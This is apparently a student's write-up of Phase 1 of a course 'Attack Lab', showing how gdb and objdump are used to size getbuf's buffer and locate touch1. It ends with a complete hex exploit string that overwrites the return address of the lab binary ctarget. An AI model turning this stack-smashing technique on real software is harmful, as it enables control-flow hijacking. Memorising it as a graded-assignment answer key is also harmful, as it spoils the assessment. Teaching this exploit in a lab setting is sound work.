# CSCI 3160 Attack Lab Report

### **Phase 1**
Phase 1 is the first part of the Attack Lab and this is done on ctarget. In this phase, we are trying to smash the stack with our exploit string and change the return address of the **getbuf** function to the address of **touch1**, and call it. 

We first need to find how large our buffer is by looking at the disassembled code. 

Run ctarget in gdb
```
gdb ctarget
```

Next, set a breakpoint at the getbuf function

```
b getbuf
```

Run GDB, then take a look at the disassembled code

```
disas
 ```

The buffer is constant during runtime and mine is **$0x18**, which is 24 bytes.

```
Dump of assembler code for function getbuf:
=> 0x0000000000401cf4 <+0>:     endbr64
   0x0000000000401cf8 <+4>:     sub    $0x18,%rsp
   0x0000000000401cfc <+8>:     mov    %rsp,%rdi
   0x0000000000401cff <+11>:    call   0x401fbd <Gets>
   0x0000000000401d04 <+16>:    mov    $0x1,%eax
   0x0000000000401d09 <+21>:    add    $0x18,%rsp
   0x0000000000401d0d <+25>:    ret
End of assembler dump.
```

Now that we have find the size of the buffer, next we need to find the address of **touch1**.

To find the address of **touch1**, look through the disassembled code of ctarget.

```
objdump -d ctarget > ctarget.txt
```
Next, open with an editor like VIM
```
vim ctarget.txt
```
Type ```/touch1``` to jump to it.

```
0000000000401d0e <touch1>:
  401d0e:   f3 0f 1e fa             endbr64
  401d12:   50                      push   %rax
  401d13:   58                      pop    %rax
  401d14:   48 83 ec 08             sub    $0x8,%rsp
  401d18:   c7 05 e6 47 00 00 01    movl   $0x1,0x47e6(%rip)        # 406508 <vlevel>
  401d1f:   00 00 00
  401d22:   48 8d 3d 05 25 00 00    lea    0x2505(%rip),%rdi        # 40422e <_IO_stdin_used+0x22e>
  401d29:   e8 72 f5 ff ff          call   4012a0 <puts@plt>
  401d2e:   48 8b 3d 2b 44 00 00    mov    0x442b(%rip),%rdi        # 406160 <stdout@GLIBC_2.2.5>
  401d35:   e8 66 f6 ff ff          call   4013a0 <fflush@plt>
  401d3a:   bf 01 00 00 00          mov    $0x1,%edi
  401d3f:   e8 d6 03 00 00          call   40211a <validate>
  401d44:   bf 00 00 00 00          mov    $0x0,%edi
  401d49:   e8 c2 f6 ff ff          call   401410 <exit@plt>
```

Touch1 Address: ```0x401d18```

Finally, create a file named **ctarget.lv1** and fill in your buffer size with padding. Next, enter the address of **touch1** and make sure it is in little-endian (make sure to add padding at the end too.)

It should look something like this

```
/* My buffer is 24 bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Ret Address of Touch1 */
/* 401d18 */
18 1d 40 00 00 00 00 00
```

Now to run this through the program **hex2raw**, enter the following

```
./hex2raw < ctarget.lv1 | ./ctarget
```

Congrats!, you have passed Phase 1.
